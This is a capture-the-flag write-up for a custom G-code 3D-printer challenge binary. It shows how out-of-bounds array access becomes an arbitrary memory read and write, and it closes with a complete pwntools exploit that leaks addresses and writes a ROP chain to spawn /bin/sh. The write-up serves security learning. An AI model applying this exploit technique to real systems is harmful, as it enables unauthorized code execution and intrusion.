# youwouldntdownloada3dprinter

The challenge provides a binary, a Python script, and a website. The Python script is used to visualize the results of G-code commands, while the website does not contain any useful information. The binary prompts the user to input a G-code command. By researching G-code documentation, I found [this reference](https://marlinfw.org/meta/gcode/). After fuzzing the binary with various G-code commands, I discovered that only the following commands are implemented:

```
Code  Function
G0    Moves to new position without extruding.
G1    Moves to new position while extruding.
G28   Set position to origin.
G90   Changes mode to absolute positioning.
G91   Changes mode to relative positioning. 
G92   Moves to new position without extruding.
M1    Indefinite pause (sleep).
M33   Prints the path to flag.
M82   Sets the extruder mode to absolute.
M83   Sets the extruder mode to relative.
M84   Quit the program (stop motors).
M104  Sets the extruder temperature.
M105  Reads the current temperature of the extruder, bed and the extruded value.
M106  Turns the fan on. (useless)
M107  Turns the fan off. (useless)
M109  Waits until the extruder temperature reaches the set value. (useless)
M140  Sets the heated bed temperature. (useless)
M190  Waits until the bed temperature is reached. (useless)
```

After some testing, I found that most commands do nothing. However, after using `G0 X999 Y999 Z999` and `M105`, I encountered a segmentation fault. Since this seemed interesting, I decided to reverse engineer the binary using IDA Pro, where I identified the following function causing the segmentation fault:

```c
__int64 *__fastcall read_array(__int64 *out, __int64 *pos)
{
  __int64 *result; // rax
  char value; // cl

  result = out;
  value = *(_BYTE *)(62500 * pos[0] + 250 * pos[1] + pos[2] + pos[7]);
  *(_WORD *)out = 0;
  *((_BYTE *)out + 2) = value;
  return result;
}
```
We can cleary see that the function is reading 1 byte from an array with dimensions of 250x250x250 using the position set by `G0` or `G1`. After more testing, i also found out that using `G1` in coordinates out of the array boundaries caused a segfault, leading to this function:

```c
__int64 __fastcall add_array(__int64 *pos, char value)
{
  __int64 addr; // [rsp+18h] [rbp-20h]
  _BYTE read_value[4]; // [rsp+34h] [rbp-4h] BYREF

  addr = 62500 * pos[0] + 250 * pos[1] + pos[2] + pos[7];
  read_array((__int64)read_value, pos);
  *(_BYTE *)(addr) = value + read_value[2];
  return 0;
}

```

The function calls `read_array`, reading the value stored at coordinate, then adding the desired value to the read value and storing the result at the same position.
By using `G1` and `M105` we can prove that behaviour:


```
 > Enter G-code:
G1 X0 Y0 Z0 E5
 > Linearly setting position to (0, 0, 0) 0
M105      
 > ok T:0 B:0 V:5
G1 X0 Y0 Z0 E1
 > Linearly setting position to (0, 0, 0) 0
M105
 > ok T:0 B:0 V:6
```

We can see that `G1` is adding the value to the coordinate, which we can read throught the value outputted by `M105` (`V:[value]`).

With all that in mind, we can read and write to any memory address by using `G0`, `G1` and `M105`. For exploiting this, i used IDA debugger again for finding address leaks on the `.bss` section (the same section of the array), making it possible to write a rop chain for calling `execve("/bin/sh")` and ovewriting some arbitrary function return address with the chain.

Finding the gadgets for the chain was pretty easy, since the binary is statically linked with [MUSL](https://musl.libc.org/) libc. Since we can only write 1 byte at a time, we cant rely on functions that return every time we input data or read/write values, so, for picking the right function to overwrite its return address, i just picked one on the bottom of the stack.

Final exploit:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./youwouldntdownloada3dprinter
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './youwouldntdownloada3dprinter')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled

# python version 3.13.2
# pwntools version 4.14.0

io = start()

# Read byte at coordinate (x, y, z)
def read_xyz(x, y, z):
  # Uses the G0 command to move to the specified coordinates
  # and the M105 command to read value at the current position
  payload = b""
  payload += f"G0 X{x} Y{y} Z{z}\n".encode()
  payload += b"M105"
  
  # G0 X[z] Y[y] Z[z]
  #  > Rapidly setting position to ([x], [y], [z]) 0
  # M105
  #  > ok T:0 B:0 V:[value]
  
  io.sendline(payload)
  io.recvuntil(b"V:")
  return int(io.recvline().strip())

# Read byte at offset
def read_byte(offset):
  return read_xyz(0, 0, offset)

# Read 64 bit value at offset
def read_64(offset):
  value = 0
  for i in range(8):
    byte = read_byte(offset + i)
    value |= (byte & 0xFF) << (i * 8)
  return value

# Add a byte value at coordinate (x, y, z)
def add_xyze(x, y, z, e):
  # Uses the G0 command to move to the specified coordinates
  # and the G1 command to write value at the same position
  payload = b""
  payload += f"G0 X{x} Y{y} Z{z}\n".encode()
  payload += f"G1 X{x} Y{y} Z{z} E{e}".encode()
  
  # G0 X[x] Y[y] Z[z]
  #  > Rapidly setting position to ([x], [y], [z]) 0
  # G1 X[x] Y[y] Z[z] E[e]
  #  > Linearly setting position to ([x], [y], [z]) 0
  
  io.sendline(payload)

# Write byte at offset
def write_byte(offset, value):
  # Sums the difference between the previous byte and the new byte  
  prev_byte = read_byte(offset)
  if (prev_byte == value):
    return
    
  if (prev_byte > value):
    new_byte = 0x100 - prev_byte + value
  else:
    new_byte = value - prev_byte
  
  add_xyze(0, 0, offset, new_byte)

# Write bytes starting from offset
def write_bytes(offset, data):
  for i in range(len(data)):
    write_byte(offset + i, data[i])

# Write 64 bit value at offset
def write_64(offset, value):
  for i in range(8):
    value_byte = (value >> (i * 8)) & 0xFF      
    write_byte(offset + i, value_byte)

io.recvuntil(b"> Enter G-code:\n")

text_leak = read_64(0xEE6B28) # offset for a .text address  
stack_leak = read_64(-0x8) # offset for a stack address

elf_base = text_leak - 0x18D60 # elf base address
array_base = elf_base + 0x50008 # base address used for the binary reading and writing operations
target_addr = stack_leak - 0xF8 # return address for an arbitrary function, target address for placing the ROP chain

exe.address = elf_base
rop_chain = ROP(exe, base=target_addr)

# Build the rop chain for execve("/bin/sh"),
# used raw syscall gadget to prevent pwntools from using sigreturn
syscall = rop_chain.find_gadget(["syscall", "ret"])[0]

rop_chain.rax = constants.SYS_execve
rop_chain.rdi = array_base # address of "/bin/sh"
rop_chain.rsi = 0
rop_chain.rdx = 0
rop_chain.raw(syscall)

write_bytes(0, b"/bin/sh") # write "/bin/sh" string to the array base
write_bytes(target_addr - array_base, rop_chain.chain()) # write the rop chain to the target address

# Command for finishing the execution, triggering the rop chain
io.sendline(b"M84")
io.recvuntil(b"\n")

log.success("Got shell")
io.interactive()
```

After obtaining the shell, I simply printed the flag using the `cat /flag` command. The flag's path was revealed earlier through the `M33` command.
